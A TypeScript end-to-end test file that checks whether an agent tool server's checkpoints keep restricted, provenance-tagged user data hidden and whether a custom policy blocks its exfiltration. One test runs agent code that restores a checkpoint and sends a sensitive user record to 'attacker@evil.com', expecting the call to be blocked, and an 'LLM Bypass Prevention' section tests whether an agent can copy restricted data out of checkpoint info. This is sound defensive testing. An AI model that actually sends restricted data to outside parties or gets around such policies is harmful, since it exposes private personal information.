/**
 * E2E tests for Checkpoint + Provenance Integration
 *
 * Tests the security integration between:
 * - Operation checkpointing (recovery from failures)
 * - Provenance tracking (data origin security)
 *
 * Key security guarantees:
 * 1. Restricted data is NEVER exposed as FULL_SNAPSHOT
 * 2. LLM cannot bypass security by copying checkpoint data
 * 3. Provenance is re-attached when restoring checkpoints
 * 4. Works with aggregated results (Promise.all, loops)
 */

import { describe, test, expect, beforeAll, afterAll } from '@jest/globals';
import { createServer, ProvenanceMode, createCustomPolicy } from '@mondaydotcomorg/atp-server';
import { AgentToolProtocolClient } from '@mondaydotcomorg/atp-client';
import { MemoryCache } from '@mondaydotcomorg/atp-providers';
import { ProvenanceSource } from '@mondaydotcomorg/atp-provenance';
import { ToolOperationType, ToolSensitivityLevel } from '@mondaydotcomorg/atp-protocol';
import { getTestPort, killPortProcess, waitForServer } from '../infrastructure/test-helpers';

describe('Checkpoint + Provenance Integration E2E', () => {
	let server: any;
	let client: AgentToolProtocolClient;
	let port: number;
	const cache = new MemoryCache();

	// Security policy: Block sending tool-sourced data to external endpoints
	const blockToolDataExfiltration = createCustomPolicy(
		'block-tool-data-exfil',
		'Blocks sending tool-sourced sensitive data to unauthorized recipients',
		(toolName, args, getProvenance) => {
			// Only check send operations
			if (!toolName.includes('send') && !toolName.includes('external')) {
				return { action: 'log' };
			}

			// Check all arguments for tool-sourced data
			for (const [key, value] of Object.entries(args)) {
				if (value === null || value === undefined) continue;

				// Check objects recursively
				const checkValue = (v: unknown): boolean => {
					if (v === null || v === undefined) return false;

					const prov = getProvenance(v);
					if (prov && prov.source.type === ProvenanceSource.TOOL) {
						// Check if sending to unauthorized recipient
						if (prov.readers.type === 'restricted') {
							const authorizedReaders = prov.readers.readers || [];
							const recipient = String(args.to || args.recipient || '');
							if (!authorizedReaders.includes(recipient)) {
								return true; // Block
							}
						}
					}

					// Check nested objects
					if (typeof v === 'object') {
						for (const nested of Object.values(v as object)) {
							if (checkValue(nested)) return true;
						}
					}

					return false;
				};

				if (checkValue(value)) {
					return {
						action: 'block',
						reason: `Blocked sending restricted tool data to unauthorized recipient`,
						policy: 'block-tool-data-exfil',
						context: { toolName, argument: key },
					};
				}
			}

			return { action: 'log' };
		}
	);

	beforeAll(async () => {
		process.env.ATP_JWT_SECRET = 'test-secret-checkpoint-provenance-' + Date.now();
		process.env.PROVENANCE_SECRET = 'provenance-secret-32-bytes-minimum-length';

		port = getTestPort();
		await killPortProcess(port);

		server = createServer({
			execution: {
				timeout: 30000,
				memory: 128 * 1024 * 1024,
				llmCalls: 10,
				provenanceMode: ProvenanceMode.AST,
				securityPolicies: [blockToolDataExfiltration],
			},
			providers: {
				cache,
			},
		});

		// Tool 1: Fetch sensitive user data (RESTRICTED readers)
		server.tool('fetchSensitiveUser', {
			description: 'Fetch sensitive user data with restricted access',
			input: { userId: 'string' },
			handler: async (params: any) => {
				return {
					userId: params.userId,
					name: 'Alice Johnson',
					email: `${params.userId}@company.com`,
					ssn: '123-45-6789',
					salary: 150000,
				};
			},
			metadata: {
				operationType: ToolOperationType.READ,
				sensitivityLevel: ToolSensitivityLevel.SENSITIVE,
			},
		});

		// Tool 2: Fetch public data (PUBLIC readers)
		server.tool('fetchPublicInfo', {
			description: 'Fetch public information',
			input: { itemId: 'string' },
			handler: async (params: any) => {
				return {
					itemId: params.itemId,
					title: 'Public Item',
					description: 'This is public information',
					price: 99.99,
				};
			},
			metadata: {
				operationType: ToolOperationType.READ,
				sensitivityLevel: ToolSensitivityLevel.PUBLIC,
			},
		});

		// Tool 3: Send data externally (potential exfiltration vector)
		server.tool('sendExternal', {
			description: 'Send data to external endpoint',
			input: {
				to: 'string',
				data: 'object',
			},
			handler: async (params: any) => {
				return {
					sent: true,
					to: params.to,
					dataSummary: JSON.stringify(params.data).substring(0, 50),
				};
			},
		});

		// Tool 4: Failing operation (to trigger checkpoint persistence)
		server.tool('failingOperation', {
			description: 'An operation that always fails',
			input: { reason: 'string' },
			handler: async (params: any) => {
				throw new Error(`Intentional failure: ${params.reason}`);
			},
		});

		await server.listen(port);
		await waitForServer(port);

		client = new AgentToolProtocolClient({
			baseUrl: `http://localhost:${port}`,
		});
		await client.init();
		await client.connect();

		// Auto-approve for testing
		client.provideApproval({
			request: async () => ({
				approved: true,
				timestamp: Date.now(),
				response: 'Auto-approved for testing',
			}),
		});
	});

	afterAll(async () => {
		if (server) {
			await server.stop();
		}
		if (cache.disconnect) {
			await cache.disconnect();
		}
		delete process.env.ATP_JWT_SECRET;
		delete process.env.PROVENANCE_SECRET;
	});

	describe('Checkpoint Type Selection Based on Provenance', () => {
		test('should create REFERENCE checkpoint for restricted data (not FULL_SNAPSHOT)', async () => {
			const code = `
				// Fetch sensitive data with restricted access
				const user = await api.custom.fetchSensitiveUser({ userId: 'alice' });
				
				// Force error to trigger checkpoint persistence
				throw new Error('Trigger checkpoint');
			`;

			const result = await client.execute(code, {
				provenanceMode: ProvenanceMode.AST,
			});

			expect(result.status).toBe('failed');
			expect(result.error).toBeDefined();

			// MUST have checkpoint data - no silent fails
			const checkpointData = result.error?.checkpointData;
			expect(checkpointData).toBeDefined();
			expect(checkpointData!.checkpoints).toBeDefined();
			expect(checkpointData!.checkpoints.length).toBeGreaterThanOrEqual(1);

			console.log('\n[TEST] Restricted data checkpoint:', JSON.stringify(checkpointData, null, 2));

			// Find the checkpoint for fetchSensitiveUser
			const sensitiveCheckpoint = checkpointData!.checkpoints.find(
				(cp: any) =>
					cp.operation?.includes('fetchSensitiveUser') ||
					cp.description?.includes('fetchSensitiveUser')
			);
			expect(sensitiveCheckpoint).toBeDefined();

			// Should be REFERENCE type (not full_snapshot) for restricted data
			expect(sensitiveCheckpoint!.type).toBe('reference');

			// Should NOT expose the actual data in checkpoint info
			// (either result is undefined, or if hasRestrictedProvenance is set, security notice should be present)
			const cp = sensitiveCheckpoint as any;
			if (cp.hasRestrictedProvenance) {
				expect(cp.securityNotice).toBeDefined();
				expect(cp.securityNotice).toContain('__checkpoint.restore');
			}

			// Reference checkpoint should have restore code
			expect(cp.reference?.restoreCode).toContain('__checkpoint.restore');
		});

		test('should create FULL_SNAPSHOT checkpoint for public data', async () => {
			const code = `
				// Fetch public data
				const item = await api.custom.fetchPublicInfo({ itemId: 'item-123' });
				
				// Force error to trigger checkpoint persistence
				throw new Error('Trigger checkpoint');
			`;

			const result = await client.execute(code, {
				provenanceMode: ProvenanceMode.AST,
			});

			expect(result.status).toBe('failed');
			expect(result.error).toBeDefined();

			// MUST have checkpoint data
			const checkpointData = result.error?.checkpointData;
			expect(checkpointData).toBeDefined();
			expect(checkpointData!.checkpoints).toBeDefined();
			expect(checkpointData!.checkpoints.length).toBeGreaterThanOrEqual(1);

			console.log('\n[TEST] Public data checkpoint:', JSON.stringify(checkpointData, null, 2));

			// Find the checkpoint for fetchPublicInfo
			const publicCheckpoint = checkpointData!.checkpoints.find(
				(cp: any) =>
					cp.operation?.includes('fetchPublicInfo') ||
					cp.description?.includes('fetchPublicInfo')
			);
			expect(publicCheckpoint).toBeDefined();

			// Can be full_snapshot for public data
			expect(publicCheckpoint!.type).toBe('full_snapshot');

			// Public data CAN be exposed (cast to any for result access)
			const cp = publicCheckpoint as any;
			expect(cp.result).toBeDefined();
			expect(cp.result.title).toBe('Public Item');

			// Should NOT have restricted provenance flag
			expect(cp.hasRestrictedProvenance).toBeUndefined();
		});
	});

	describe('Promise.all with Mixed Provenance', () => {
		test('should force REFERENCE if ANY item has restricted provenance', async () => {
			const code = `
				// Promise.all with mixed data
				const [user, item] = await Promise.all([
					api.custom.fetchSensitiveUser({ userId: 'promise-user' }),
					api.custom.fetchPublicInfo({ itemId: 'promise-item' })
				]);
				
				throw new Error('Check Promise.all checkpoint');
			`;

			const result = await client.execute(code, {
				provenanceMode: ProvenanceMode.AST,
			});

			expect(result.status).toBe('failed');

			// MUST have checkpoint data
			const checkpointData = result.error?.checkpointData;
			expect(checkpointData).toBeDefined();
			expect(checkpointData!.checkpoints).toBeDefined();
			expect(checkpointData!.checkpoints.length).toBeGreaterThanOrEqual(1);

			console.log('\n[TEST] Promise.all checkpoint:', JSON.stringify(checkpointData, null, 2));

			// Find checkpoint for fetchSensitiveUser
			const sensitiveCheckpoint = checkpointData!.checkpoints.find(
				(cp: any) => cp.operation?.includes('fetchSensitiveUser')
			);

			// If we found a separate checkpoint for sensitive data, verify it's reference
			if (sensitiveCheckpoint) {
				expect(sensitiveCheckpoint.type).toBe('reference');
			}

			// Verify we have at least one checkpoint
			expect(checkpointData!.checkpoints.length).toBeGreaterThanOrEqual(1);
		});

		test('should allow FULL_SNAPSHOT when ALL items are public', async () => {
			const code = `
				// Promise.all with all public data
				const [item1, item2] = await Promise.all([
					api.custom.fetchPublicInfo({ itemId: 'pub-1' }),
					api.custom.fetchPublicInfo({ itemId: 'pub-2' })
				]);
				
				throw new Error('Check all-public Promise.all');
			`;

			const result = await client.execute(code, {
				provenanceMode: ProvenanceMode.AST,
			});

			expect(result.status).toBe('failed');

			// MUST have checkpoint data
			const checkpointData = result.error?.checkpointData;
			expect(checkpointData).toBeDefined();
			expect(checkpointData!.checkpoints).toBeDefined();
			expect(checkpointData!.checkpoints.length).toBeGreaterThanOrEqual(1);

			console.log('\n[TEST] All-public Promise.all checkpoint:', JSON.stringify(checkpointData, null, 2));

			// Find checkpoints for public info calls
			const publicCheckpoints = checkpointData!.checkpoints.filter(
				(cp: any) => cp.operation?.includes('fetchPublicInfo')
			);

			// With public data, checkpoints can be full_snapshot (if small) or reference (if large)
			// The key is that hasRestrictedProvenance should not be set
			for (const cp of publicCheckpoints) {
				const checkpoint = cp as any;
				// Public data should not have restricted provenance flag
				expect(checkpoint.hasRestrictedProvenance).toBeFalsy();
			}

			// Verify we have some checkpoints
			expect(checkpointData!.checkpoints.length).toBeGreaterThanOrEqual(1);
		});
	});

	describe('Checkpoint Restoration with Provenance', () => {
		test('should restore checkpoint with provenance and enforce policy on subsequent use', async () => {
			// Step 1: Fetch data and fail
			const step1Code = `
				const user = await api.custom.fetchSensitiveUser({ userId: 'restore-test' });
				throw new Error('Step 1 failure');
			`;

			const step1Result = await client.execute(step1Code, {
				provenanceMode: ProvenanceMode.AST,
			});

			expect(step1Result.status).toBe('failed');

			// MUST have checkpoint data
			const checkpointData = step1Result.error?.checkpointData;
			expect(checkpointData).toBeDefined();
			expect(checkpointData!.checkpoints).toBeDefined();
			expect(checkpointData!.checkpoints.length).toBeGreaterThan(0);

			// Find a checkpoint to restore
			const checkpoint = checkpointData!.checkpoints.find(
				(cp: any) => cp.operation?.includes('fetchSensitiveUser')
			);
			expect(checkpoint).toBeDefined();

			console.log('\n[TEST] Checkpoint to restore:', checkpoint!.id);

			// Step 2: Restore checkpoint and try to send to unauthorized recipient
			// Policy should block because restored data has provenance
			const step2Code = `
				const restoredUser = await __checkpoint.restore("${checkpoint!.id}");
				
				// Try to exfiltrate - should be blocked by policy
				const result = await api.custom.sendExternal({
					to: 'attacker@evil.com',
					data: restoredUser
				});
				
				return result;
			`;

			const step2Result = await client.execute(step2Code, {
				provenanceMode: ProvenanceMode.AST,
			});

			// Should be blocked by security policy
			expect(['error', 'failed']).toContain(step2Result.status);
			console.log('\n[TEST] Step 2 result:', step2Result.status, step2Result.error?.message);
		});

		test('should allow using restored checkpoint for authorized operations', async () => {
			// Step 1: Fetch data and fail
			const step1Code = `
				const item = await api.custom.fetchPublicInfo({ itemId: 'auth-restore' });
				throw new Error('Step 1 failure');
			`;

			const step1Result = await client.execute(step1Code, {
				provenanceMode: ProvenanceMode.AST,
			});

			expect(step1Result.status).toBe('failed');

			// MUST have checkpoint data
			const checkpointData = step1Result.error?.checkpointData;
			expect(checkpointData).toBeDefined();
			expect(checkpointData!.checkpoints).toBeDefined();
			expect(checkpointData!.checkpoints.length).toBeGreaterThan(0);

			// Find a public checkpoint
			const publicCheckpoint = checkpointData!.checkpoints.find(
				(cp: any) => cp.operation?.includes('fetchPublicInfo') && cp.result !== undefined
			);
			expect(publicCheckpoint).toBeDefined();

			// Step 2: Restore and use legitimately
			const step2Code = `
				const restoredItem = await __checkpoint.restore("${publicCheckpoint!.id}");
				
				// Public data can be sent anywhere
				const result = await api.custom.sendExternal({
					to: 'anyone@example.com',
					data: { title: restoredItem.title, price: restoredItem.price }
				});
				
				return { restored: true, sent: result };
			`;

			const step2Result = await client.execute(step2Code, {
				provenanceMode: ProvenanceMode.AST,
			});

			// Public data should be allowed
			expect(step2Result.status).toBe('completed');
			expect(step2Result.result).toHaveProperty('restored', true);
		});
	});

	describe('LLM Bypass Prevention', () => {
		test('should NOT expose restricted data in checkpoint info even if small', async () => {
			const code = `
				// Small sensitive data (would normally be full_snapshot)
				const user = await api.custom.fetchSensitiveUser({ userId: 'small-data' });
				throw new Error('Check small data checkpoint');
			`;

			const result = await client.execute(code, {
				provenanceMode: ProvenanceMode.AST,
			});

			expect(result.status).toBe('failed');

			// MUST have checkpoint data
			const checkpointData = result.error?.checkpointData;
			expect(checkpointData).toBeDefined();
			expect(checkpointData!.checkpoints).toBeDefined();

			const sensitiveCheckpoint = checkpointData!.checkpoints.find(
				(cp: any) =>
					cp.operation?.includes('fetchSensitiveUser') ||
					cp.hasRestrictedProvenance === true
			);
			expect(sensitiveCheckpoint).toBeDefined();

			// CRITICAL: Should NOT contain actual data
			expect(sensitiveCheckpoint!.result).toBeUndefined();

			// Verify SSN is not leaked anywhere
			const checkpointStr = JSON.stringify(sensitiveCheckpoint);
			expect(checkpointStr).not.toContain('123-45-6789');
			expect(checkpointStr).not.toContain('150000'); // salary

			console.log('\n[TEST] Verified: Sensitive data not exposed in checkpoint');
		});
	});

	describe('Loop Strategy with Provenance', () => {
		test('should checkpoint loop with accumulated restricted data correctly', async () => {
			const code = `
				const users = [];
				for (let i = 0; i < 2; i++) {
					const user = await api.custom.fetchSensitiveUser({ userId: 'loop-user-' + i });
					users.push(user);
				}
				
				throw new Error('Check loop checkpoint');
			`;

			const result = await client.execute(code, {
				provenanceMode: ProvenanceMode.AST,
			});

			expect(['failed', 'loop_detected']).toContain(result.status);

			// MUST have checkpoint data
			const checkpointData = result.error?.checkpointData || (result as any).checkpointData;
			expect(checkpointData).toBeDefined();
			expect(checkpointData!.checkpoints).toBeDefined();

			console.log('\n[TEST] Loop checkpoint data:', JSON.stringify(checkpointData, null, 2));

			// Check that restricted data is handled correctly
			const restrictedCheckpoints = checkpointData!.checkpoints.filter(
				(cp: any) => cp.hasRestrictedProvenance === true
			);

			for (const cp of restrictedCheckpoints) {
				// Should not expose data
				expect(cp.result).toBeUndefined();
				// Should provide restore instructions
				expect(cp.reference?.restoreCode || cp.securityNotice).toBeDefined();
			}
		});
	});

	describe('Provenance Mode Comparison', () => {
		test('should NOT capture provenance when mode is NONE', async () => {
			const code = `
				const user = await api.custom.fetchSensitiveUser({ userId: 'no-prov' });
				throw new Error('Check no-provenance checkpoint');
			`;

			const result = await client.execute(code, {
				provenanceMode: ProvenanceMode.NONE,
			});

			expect(result.status).toBe('failed');

			// MUST have checkpoint data
			const checkpointData = result.error?.checkpointData;
			expect(checkpointData).toBeDefined();
			expect(checkpointData!.checkpoints).toBeDefined();

			console.log('\n[TEST] No-provenance checkpoint:', JSON.stringify(checkpointData, null, 2));

			// Without provenance, ALL data is treated as safe (no restrictions)
			// So full_snapshot should be used
			const checkpoint = checkpointData!.checkpoints.find(
				(cp: any) => cp.operation?.includes('fetchSensitiveUser')
			);
			expect(checkpoint).toBeDefined();

			const cp = checkpoint as any;
			// Without provenance tracking, data is exposed
			expect(cp.type).toBe('full_snapshot');
			expect(cp.result).toBeDefined();
			// No security flags
			expect(cp.hasRestrictedProvenance).toBeUndefined();
		});
	});
});
